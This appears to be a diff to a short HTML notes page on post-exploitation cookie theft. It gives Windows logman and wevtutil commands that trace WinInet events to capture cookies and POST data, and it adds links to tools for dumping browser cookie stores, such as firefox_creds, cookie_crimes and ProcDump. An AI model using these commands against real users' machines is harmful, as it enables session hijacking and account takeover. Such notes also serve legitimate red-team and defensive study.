@@ -5,9 +5,23 @@
 <title>Web Cookies</title>
 </head><body>http://pauldotcom.com/2012/07/post-exploitation-recon-with-e.html<br/>
 <br/>
+<b>Windows </b><br/>
 logman start LogCookies -p Microsoft-Winodws-WinInet -o logcookies.etl -ets<br/>
 <br/>
 wevtutil qe logcookies.etl /If:true /f:Text | find /i "cookie added"<br/>
 wevtutil qe logcookies.etl /If:true /f:Text | find /i "POST"<br/>
 <br/>
-logman stop LogCookies -ets</body></html>
+logman stop LogCookies -ets<br/>
+<br/>
+<br/>
+<br/>
+https://wunderwuzzi23.github.io/blog/passthecookie.html#CheatSheet<br/>
+<br/>
+<b>Aquiring Cookies, Tools and Techniques</b><br/>
+<div style="text-align: justify"><span style="font-family: sans"><span style="font-size: 10pt">In case you don't won't to write your own toolset, there are a couple of options available to gain access to cookies:</span></span></div><ul><li><b><a href="https://www.offensive-security.com/metasploit-unleashed/multiple-os-post-gather-modules/">firefox_creds</a></b><a href="https://www.offensive-security.com/metasploit-unleashed/multiple-os-post-gather-modules/"> - Access the SQL Lite Cookie Databases</a></li>
+<li><b><a href="https://github.com/defaultnamehere/cookie_crimes">cookie_crimes</a></b><a href="https://github.com/defaultnamehere/cookie_crimes"> - Neat way to grab cookies from Chrome on Macs (also Windows and Linux)</a></li>
+<li><b><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a></b><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"> - Swiss army knife to dump strings from any process</a></li>
+</ul>
+There are also good articles online describing how to access and decrypt the cookies in the SQL Lite databases yourself - if you'd like to do your own research or tool.<br/>
+<br/>
+</body></html>
